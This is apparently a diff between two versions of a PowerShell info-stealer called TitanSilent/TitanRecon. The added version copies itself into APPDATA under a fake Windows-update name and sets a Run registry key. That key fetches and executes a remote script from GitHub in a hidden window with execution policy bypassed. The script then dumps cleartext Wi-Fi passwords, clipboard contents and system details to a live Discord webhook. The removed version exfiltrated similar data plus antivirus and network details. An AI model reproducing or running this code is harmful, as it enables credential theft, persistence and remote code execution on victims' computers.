@@ -1,51 +1,40 @@
-# TitanSilent v2
-$webhook = "https://discord.com/api/webhooks/1356723527486804138/8uoObVFzZbql8opsETphWlbiXPSbYSZOgSW9mxfx_-A4olDcCGD3FQvslxUJ4UjvCE_L"  # 👈 dein Webhook
 $ErrorActionPreference = "SilentlyContinue"
-Add-Type -AssemblyName System.Web
+$webhook = "https://discord.com/api/webhooks/1356723527486804138/8uoObVFzZbql8opsETphWlbiXPSbYSZOgSW9mxfx_-A4olDcCGD3FQvslxUJ4UjvCE_L"
 
 function Send($msg) {
     $json = @{content = $msg} | ConvertTo-Json -Depth 3
     Invoke-RestMethod -Uri $webhook -Method POST -Body $json -ContentType 'application/json'
 }
 
-# 🧠 USER INFO
-$userInfo = "`n🧠 **User Info**`nUsername: $env:USERNAME`nComputer: $env:COMPUTERNAME`nDomain: $env:USERDOMAIN`nAdmin: $([bool]([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))"
-Send $userInfo
-
-# 🌐 NETWORK
-$ip = (Invoke-RestMethod -Uri "https://api.ipify.org?format=json").ip
-$net = Get-NetIPConfiguration | Where-Object { $_.IPv4Address -ne $null }
-$netInfo = "`n🌐 **Network Info**`nPublic IP: $ip`n"
-foreach ($n in $net) {
-    $netInfo += "Adapter: $($n.InterfaceAlias)`nIPv4: $($n.IPv4Address.IPAddress)`nGW: $($n.IPv4DefaultGateway.NextHop)`nDNS: $($n.DnsServer.ServerAddresses -join ', ')`n`n"
+# 🕶️ Stealth Copy
+$target = "$env:APPDATA\MicrosoftWinUpdate.ps1"
+if (!(Test-Path $target)) {
+    Copy-Item -Path $PSCommandPath -Destination $target -Force
+    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdater" /d "powershell -w hidden -ep bypass -c iex(iwr -UseBasicParsing 'https://raw.githubusercontent.com/titanxrio/ps1/main/v4.ps1')" /f
 }
-Send $netInfo
+
+# 🌍 IP
+$ip = (Invoke-RestMethod -Uri "https://api.ipify.org?format=json").ip
+
+# 🧠 User & System
+$uname = $env:USERNAME
+$pc = $env:COMPUTERNAME
+$os = (Get-CimInstance Win32_OperatingSystem).Caption
+$msg = "**[TitanRecon v4]**`n👤 $uname`n🖥️ $pc`n💿 $os`n🌐 IP: $ip"
 
 # 📡 WLAN KEYS
 $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[1].Trim() }
-$wifi = "`n📡 **WLAN Keys**`n"
+$wifi = ""
 foreach ($p in $profiles) {
     $pw = netsh wlan show profile name="$p" key=clear | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[1].Trim() }
-    $wifi += "$p → $pw`n"
+    $wifi += "`n$p → $pw"
 }
-Send $wifi
 
-# 📋 CLIPBOARD
+# 📋 Clipboard
 $clip = Get-Clipboard
-if ($clip -ne "") { Send "`n📋 **Clipboard:**`n$clip" }
+if ($clip -eq "") { $clip = "[empty]" }
 
-# 💿 OS INFO
-$os = Get-CimInstance Win32_OperatingSystem
-$osInfo = "`n💿 **OS Info**`n$($os.Caption) $($os.OSArchitecture)`nInstall: $($os.InstallDate)`nLast Boot: $($os.LastBootUpTime)`nUser: $($os.RegisteredUser)`nBuild: $($os.BuildNumber)"
-Send $osInfo
-
-# 🔐 AV Info
-$av = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName "AntivirusProduct"
-$avList = ($av.displayName -join ", ")
-Send "`n🔐 **Antivirus Detected:**`n$avList"
-
-# 📁 FILE SYSTEM
-$files = Get-ChildItem "$env:USERPROFILE\Documents" -Recurse -ErrorAction SilentlyContinue | Measure-Object
-Send "`n📁 **User Documents:**`n$($files.Count) files detected in Documents folder."
-
-# (Optional Features nach Wunsch zubuchbar)
+# ✉️ Full Send
+$msg += "`n📡 **WLANs:**`n$wifi`n`n📋 **Clipboard:**`n$clip"
+Send $msg
+exit
